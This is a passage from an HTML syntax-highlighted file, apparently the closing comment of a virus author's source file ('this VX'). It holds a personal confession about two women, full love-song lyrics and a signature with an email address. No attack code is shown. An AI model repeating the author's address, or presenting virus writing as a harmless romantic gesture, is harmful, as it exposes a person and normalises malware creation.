 </span><span class="sc5">that</span><span class="sc0"> </span><span class="sc5">beat</span><span class="sc0"> </span><span class="sc5">Me</span><span class="sc0"> </span><span class="sc5">hardly</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc5">it</span><span class="sc0"> </span><span class="sc5">is</span><span class="sc0"> </span><span class="sc5">now</span><span class="sc0"> </span><span class="sc5">going</span><span class="sc0"> </span><span class="sc5">harder</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc5">harder...</span><span class="sc0">  </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">girl</span><span class="sc0"> </span><span class="sc5">of</span><span class="sc0"> </span><span class="sc5">My</span><span class="sc0">
 </span><span class="sc5">dreams...</span><span class="sc0"> </span><span class="sc5">She</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">She</span><span class="sc0"> </span><span class="sc5">is</span><span class="sc0"> </span><span class="sc6">NOT</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">repeat</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">NOT</span><span class="sc0"> </span><span class="sc5">Irma</span><span class="sc0"> </span><span class="sc5">but</span><span class="sc0"> </span><span class="sc5">Mia</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">repeat</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">yes</span><span class="sc0"> </span><span class="sc5">She</span><span class="sc0"> </span><span class="sc5">IS</span><span class="sc0"> </span><span class="sc5">Mia</span><span class="sc4">,</span><span class="sc0">
 </span><span class="sc5">surprised?</span><span class="sc0"> </span><span class="sc5">Mia</span><span class="sc0"> </span><span class="sc5">Herself</span><span class="sc0"> </span><span class="sc9">even</span><span class="sc0"> </span><span class="sc5">doesn</span><span class="sc13">'t know it anyway, ;-), She just thinks the
</span><span class="sc0"> </span><span class="sc5">opposite</span><span class="sc0"> </span><span class="sc5">thing</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc5">I</span><span class="sc0"> </span><span class="sc5">love</span><span class="sc0"> </span><span class="sc5">Irma</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc5">I</span><span class="sc0"> </span><span class="sc5">hate</span><span class="sc0"> </span><span class="sc5">Mia</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">whereas</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">in</span><span class="sc0"> </span><span class="sc5">fact</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">it</span><span class="sc0"> </span><span class="sc5">is</span><span class="sc0"> </span><span class="sc5">just</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0">
 </span><span class="sc5">right</span><span class="sc0"> </span><span class="sc5">anyhow</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">I</span><span class="sc0"> </span><span class="sc5">love</span><span class="sc0"> </span><span class="sc5">Mia</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc5">I</span><span class="sc12">'m just one of Irma'</span><span class="sc5">s</span><span class="sc0"> </span><span class="sc5">friend</span><span class="sc4">),</span><span class="sc0">  </span><span class="sc5">I</span><span class="sc0"> </span><span class="sc5">just</span><span class="sc0"> </span><span class="sc5">lied</span><span class="sc0"> </span><span class="sc5">to</span><span class="sc0">
 </span><span class="sc5">Mia</span><span class="sc0"> </span><span class="sc5">easily</span><span class="sc0"> </span><span class="sc5">about</span><span class="sc0"> </span><span class="sc5">that</span><span class="sc0"> </span><span class="sc5">matter</span><span class="sc0"> </span><span class="sc5">on</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">first</span><span class="sc0"> </span><span class="sc5">day</span><span class="sc0"> </span><span class="sc5">I</span><span class="sc0"> </span><span class="sc5">met</span><span class="sc0"> </span><span class="sc5">Her</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">read</span><span class="sc0"> </span><span class="sc5">MIA.TXT</span><span class="sc4">)</span><span class="sc5">.</span><span class="sc0">  </span><span class="sc5">but</span><span class="sc0">
 </span><span class="sc5">one</span><span class="sc0"> </span><span class="sc5">main</span><span class="sc0"> </span><span class="sc5">thing</span><span class="sc0"> </span><span class="sc5">is</span><span class="sc0"> </span><span class="sc5">that</span><span class="sc0"> </span><span class="sc5">I</span><span class="sc0"> </span><span class="sc5">wanna</span><span class="sc0"> </span><span class="sc5">thank</span><span class="sc0"> </span><span class="sc5">Mia</span><span class="sc0"> </span><span class="sc5">W.</span><span class="sc0"> </span><span class="sc5">who</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">however</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">helped</span><span class="sc0"> </span><span class="sc5">Me</span><span class="sc0"> </span><span class="sc5">a</span><span class="sc0"> </span><span class="sc5">lot</span><span class="sc0"> </span><span class="sc6">in</span><span class="sc0">
 </span><span class="sc5">writing</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc5">VX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">hey</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">I</span><span class="sc0"> </span><span class="sc5">don</span><span class="sc13">'t forget to apologize for all My boasts... 8-)
</span><span class="sc0">





















 </span><span class="sc5">Saying</span><span class="sc0"> </span><span class="sc3">"I love You"</span><span class="sc0"> </span><span class="sc5">is</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">words</span><span class="sc0"> </span><span class="sc5">I</span><span class="sc0"> </span><span class="sc5">want</span><span class="sc0"> </span><span class="sc5">to</span><span class="sc0"> </span><span class="sc5">hear</span><span class="sc0"> </span><span class="sc5">from</span><span class="sc0"> </span><span class="sc5">You</span><span class="sc0">
 </span><span class="sc5">It</span><span class="sc13">'s not that I want You not to say, but if You only knew...
</span><span class="sc0"> </span><span class="sc5">How</span><span class="sc0"> </span><span class="sc5">easy</span><span class="sc0"> </span><span class="sc5">it</span><span class="sc0"> </span><span class="sc5">would</span><span class="sc0"> </span><span class="sc5">be</span><span class="sc0"> </span><span class="sc5">to</span><span class="sc0"> </span><span class="sc5">show</span><span class="sc0"> </span><span class="sc5">Me</span><span class="sc0"> </span><span class="sc5">how</span><span class="sc0"> </span><span class="sc5">You</span><span class="sc0"> </span><span class="sc5">feel...</span><span class="sc0">

 </span><span class="sc5">More</span><span class="sc0"> </span><span class="sc5">than</span><span class="sc0"> </span><span class="sc5">words</span><span class="sc0"> </span><span class="sc5">is</span><span class="sc0"> </span><span class="sc10">all</span><span class="sc0"> </span><span class="sc5">You</span><span class="sc0"> </span><span class="sc5">have</span><span class="sc0"> </span><span class="sc5">to</span><span class="sc0"> </span><span class="sc5">do</span><span class="sc0"> </span><span class="sc5">to</span><span class="sc0"> </span><span class="sc5">make</span><span class="sc0"> </span><span class="sc5">it</span><span class="sc0"> </span><span class="sc5">real</span><span class="sc0">
 </span><span class="sc5">Then</span><span class="sc0"> </span><span class="sc5">You</span><span class="sc0"> </span><span class="sc5">wouldn</span><span class="sc13">'t have to say that You love Me...
</span><span class="sc0"> </span><span class="sc12">'cause I'</span><span class="sc5">d</span><span class="sc0"> </span><span class="sc5">already</span><span class="sc0"> </span><span class="sc5">known...</span><span class="sc0">

 </span><span class="sc5">What</span><span class="sc0"> </span><span class="sc5">would</span><span class="sc0"> </span><span class="sc5">You</span><span class="sc0"> </span><span class="sc5">do...</span><span class="sc0">
 </span><span class="sc9">If</span><span class="sc0"> </span><span class="sc5">My</span><span class="sc0"> </span><span class="sc5">heart</span><span class="sc0"> </span><span class="sc5">was</span><span class="sc0"> </span><span class="sc5">torn</span><span class="sc0"> </span><span class="sc6">in</span><span class="sc0"> </span><span class="sc5">two?</span><span class="sc0">
 </span><span class="sc5">More</span><span class="sc0"> </span><span class="sc5">than</span><span class="sc0"> </span><span class="sc5">words</span><span class="sc0"> </span><span class="sc5">to</span><span class="sc0"> </span><span class="sc5">show</span><span class="sc0"> </span><span class="sc5">how</span><span class="sc0"> </span><span class="sc5">You</span><span class="sc0"> </span><span class="sc5">feel</span><span class="sc0"> </span><span class="sc5">that</span><span class="sc0"> </span><span class="sc5">Your</span><span class="sc0"> </span><span class="sc5">love</span><span class="sc0"> </span><span class="sc9">for</span><span class="sc0"> </span><span class="sc5">Me</span><span class="sc0"> </span><span class="sc5">is</span><span class="sc0"> </span><span class="sc5">real</span><span class="sc0">
 </span><span class="sc5">What</span><span class="sc0"> </span><span class="sc5">would</span><span class="sc0"> </span><span class="sc5">You</span><span class="sc0"> </span><span class="sc5">say...</span><span class="sc0">
 </span><span class="sc9">If</span><span class="sc0"> </span><span class="sc5">I</span><span class="sc0"> </span><span class="sc5">took</span><span class="sc0"> </span><span class="sc5">those</span><span class="sc0"> </span><span class="sc5">words</span><span class="sc0"> </span><span class="sc5">away?</span><span class="sc0">
 </span><span class="sc5">Then</span><span class="sc0"> </span><span class="sc5">You</span><span class="sc0"> </span><span class="sc5">couldn</span><span class="sc13">'t make things new just by saying "I love You"...
</span><span class="sc0">
 </span><span class="sc5">Now</span><span class="sc0"> </span><span class="sc5">that</span><span class="sc0"> </span><span class="sc5">I</span><span class="sc13">'ve tried to talk to You and make You understand
</span><span class="sc0"> </span><span class="sc10">All</span><span class="sc0"> </span><span class="sc5">You</span><span class="sc0"> </span><span class="sc5">have</span><span class="sc0"> </span><span class="sc5">to</span><span class="sc0"> </span><span class="sc5">do</span><span class="sc0"> </span><span class="sc5">is</span><span class="sc0"> </span><span class="sc5">close</span><span class="sc0"> </span><span class="sc5">Your</span><span class="sc0"> </span><span class="sc5">eyes</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc5">just</span><span class="sc0"> </span><span class="sc5">reach</span><span class="sc0"> </span><span class="sc6">out</span><span class="sc0"> </span><span class="sc5">your</span><span class="sc0"> </span><span class="sc5">hands</span><span class="sc0">
 </span><span class="sc6">And</span><span class="sc0"> </span><span class="sc5">touch</span><span class="sc0"> </span><span class="sc5">Me</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">hold</span><span class="sc0"> </span><span class="sc5">Me</span><span class="sc0"> </span><span class="sc5">close</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">don</span><span class="sc13">'t ever let Me go...
</span><span class="sc0">
 </span><span class="sc5">More</span><span class="sc0"> </span><span class="sc5">than</span><span class="sc0"> </span><span class="sc5">words</span><span class="sc0"> </span><span class="sc5">is</span><span class="sc0"> </span><span class="sc10">all</span><span class="sc0"> </span><span class="sc5">I</span><span class="sc0"> </span><span class="sc5">ever</span><span class="sc0"> </span><span class="sc5">needed</span><span class="sc0"> </span><span class="sc5">You</span><span class="sc0"> </span><span class="sc5">to</span><span class="sc0"> </span><span class="sc5">show</span><span class="sc0">
 </span><span class="sc5">Then</span><span class="sc0"> </span><span class="sc5">You</span><span class="sc0"> </span><span class="sc5">wouldn</span><span class="sc13">'t have to say that You love Me...
</span><span class="sc0"> </span><span class="sc12">'cause I'</span><span class="sc5">d</span><span class="sc0"> </span><span class="sc5">already</span><span class="sc0"> </span><span class="sc5">known...</span><span class="sc0">





















                                                                </span><span class="sc5">Lots</span><span class="sc0"> </span><span class="sc5">of</span><span class="sc0"> </span><span class="sc5">love</span><span class="sc4">,</span><span class="sc0">
                                                    </span><span class="sc5">Fulvian</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">fulvian@usa.net</span><span class="sc4">&gt;</span><span class="sc0"> ˇ
</span></div></body>
</html>
